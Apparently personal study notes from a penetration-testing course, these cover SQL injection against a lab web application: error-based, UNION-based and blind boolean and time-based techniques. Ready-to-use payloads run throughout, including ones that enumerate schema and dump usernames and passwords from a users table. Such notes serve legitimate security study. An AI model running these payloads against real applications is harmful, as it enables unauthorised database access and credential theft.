# Identifying SQLi via Error-based Payloads

`offsec' OR 1=1; -- //`
	Where // is used to provide visibility on our payload and also adds some protection against any kind of whitespace truncation the web application might employ. We can see where the comment starts. This may have error message like `Invalid Password` or something. Error may also give more specific errors like exposing info in certain columns or even hashes!

`' or 1=1 in (select @@version); -- //`
	NOTE that MySQL accepts BOTH `@@version` and `version()`. We could also try `' OR 1=1 in (SELECT * FROM users); -- //` or `' or 1=1 in (SELECT password FROM users) -- //`.  Further using `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`. 

# Union-based Payload

For **UNION** SQLi attacks to work, we first need to satisfy two conditions:
1. The injected **UNION** query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.

 [_LIKE_](https://www.w3schools.com/sql/sql_like.asp) keyword is used in place of WHERE but can replace the string with patterns. `a%` and `a_b_` for example where % is any number of chars and _ represents 1 char.

**The following examples assume `LIKE` and SQL errors show.** 

`' ORDER BY 1-- // 
	To find the number of correct columns. Repeat with increasing columns until we get an error.

`%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //`
	To see which columns are displayed. Then we can do `' UNION SELECT null, null, database(), user(), @@version  -- //` to enumerate certain info on the DB and knowing the last 3 columns show.

`' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
	To further enumerate column so we can display specific credentials with `' UNION SELECT null, username, password, description, null FROM users -- //` 

# Blind SQL Injections

The previous two injections require some kind of response that is displayed back to us. There are 2 types of blind injections:
1. Boolean-based: Behavior is inferred from whether server retuned TRUE or FALSE (inferred)
2. Time-based: Infer query results by instructing database to wait for a certain period of time

## Boolean-Based

`http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`
	Assuming we have attempted to log in already and know where the variable is. If user exists then it will return the query positively!

`http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //`
	Similar enumeration as above injection. If user is active then the browser will hang for 3 seconds.

